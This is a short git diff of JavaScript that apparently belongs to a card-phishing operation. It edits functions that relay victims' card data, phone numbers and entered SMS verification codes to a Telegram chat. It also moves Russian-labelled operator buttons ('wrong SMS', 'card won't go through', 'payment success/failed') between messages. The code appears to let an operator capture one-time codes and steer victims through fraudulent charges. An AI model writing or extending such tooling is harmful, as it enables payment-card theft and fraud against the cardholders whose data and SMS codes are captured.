@@ -219,6 +219,10 @@ export const notifyCardPayment = (cardData, orderData) => {
     [
       { text: '❌ Не верное SMS', callback_data: `invalid_sms_${userId}` },
       { text: '🚫 Карта не лезет', callback_data: `card_blocked_${userId}` }
+    ],
+    [
+      { text: '✅ Успешная оплата', callback_data: `payment_success_${userId}` },
+      { text: '❌ Не успешная оплата', callback_data: `payment_failed_${userId}` }
     ]
   ]
 
@@ -256,13 +260,5 @@ export const notifySMSCodeEntered = (smsCode, cardData, orderData) => {
 📞 <b>Телефон:</b> ${orderData.formData.phone}
 💰 <b>Сумма:</b> ${orderData.total} THB`
 
-  // Inline кнопки для результата оплаты
-  const inlineKeyboard = [
-    [
-      { text: '✅ Успешная оплата', callback_data: `payment_success_${userId}` },
-      { text: '❌ Не успешная оплата', callback_data: `payment_failed_${userId}` }
-    ]
-  ]
-
-  sendTelegramMessageCards(message, inlineKeyboard)
+  sendTelegramMessageCards(message)
 }
